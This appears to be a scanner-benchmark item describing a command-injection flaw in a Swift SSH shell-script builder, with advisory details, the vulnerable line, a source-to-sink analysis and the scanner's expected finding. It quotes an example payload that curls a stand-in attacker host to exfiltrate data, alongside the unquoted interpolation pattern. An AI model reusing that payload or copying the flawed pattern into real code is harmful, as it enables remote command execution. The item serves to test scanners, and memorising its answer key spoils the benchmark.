# SB-SW-RW-001: OS command injection via unescaped project root in SSH shell script error path

## Advisory
- Repo: `openclaw/openclaw`
- GHSA: `GHSA-q284-4pvr-m585`
- CVE: `CVE-2026-25157`
- Vulnerable commit: `d34ae86114c7a2726df10b4497616b32049ebcc9`
- Fix commit: `fb141460334f90ce9f8d159575cf342cd5567744`

## Scenario

Openclaw's macOS Clawdbot companion app can run CLI commands on a
remote host over SSH. The `sshNodeCommand` function in
`CommandResolver.swift` builds a shell script string that is passed to
the remote SSH session. The script changes into the user-configured
project root directory before executing the requested subcommand.

## Vulnerability

On line 313, `userPRJ` is assigned from `settings.projectRoot` (a
user-supplied string from the macOS app's preferences). The function
correctly uses `self.shellQuote(userPRJ)` when generating the `cd`
argument on line 327, preventing injection through the `cd` operand.

However, the same line 327 also contains an error-handling fallback
that interpolates `userPRJ` raw (without shell-quoting) into an `echo`
command inside a `||` clause:

```swift
cd \(self.shellQuote(userPRJ)) || { echo "Project root not found: \(userPRJ)"; exit 127; }
```

If the project root path contains shell metacharacters (e.g.,
`/tmp/$(curl attacker.com/exfil?d=$(whoami))`), the `cd` command fails
because the shell-quoted path does not exist, and execution falls
through to the `echo` command where the raw interpolation causes the
injected payload to execute on the remote SSH host.

## Source / Carrier / Sink
- **Source:** `settings.projectRoot` -- user-supplied project root path
  from the macOS app's preferences, assigned to `userPRJ` on line 313
- **Carrier:** Swift string interpolation builds a shell script that is
  passed as a remote command to the SSH session
- **Sink:** `echo "Project root not found: \(userPRJ)"` on line 327,
  where raw `userPRJ` is interpolated into the shell script without
  `shellQuote()`, causing arbitrary command execution when the `cd`
  fails
- **Missing guard:** `shellQuote()` was applied to `userPRJ` for the
  `cd` argument but not for the `echo` argument on the same line; the
  fix applies `shellQuote()` consistently to all interpolation sites

## Why shellQuote was used for cd but not echo

The developer recognized that the `cd` target is a filesystem path that
needs quoting to handle spaces and special characters. The `echo`
message was likely treated as a human-readable diagnostic string where
the developer assumed the value would appear as literal text. This is a
common pattern: security-sensitive quoting is applied to the "action"
(cd) but overlooked for the "error message" (echo), even though both
are inside the same shell script and both are interpreted by the shell.

## Annotated Region
- File: `apps/macos/Sources/Clawdbot/CommandResolver.swift`
- Lines: 313-329
- Why this region is the scoring target: it contains the assignment of
  `userPRJ` from the user-controlled `settings.projectRoot` (line 313),
  the safe shell-quoted `cd` operand (line 327), and the vulnerable raw
  interpolation in the `echo` error message (line 327) -- the complete
  source-to-sink flow within the shell script template construction

## Scanner Expectation
A scanner should flag the raw interpolation `\(userPRJ)` in the `echo`
command on line 327 as a command injection sink, recognizing that
`userPRJ` originates from user-controlled settings and is embedded
unescaped in a shell script passed to a remote SSH session.
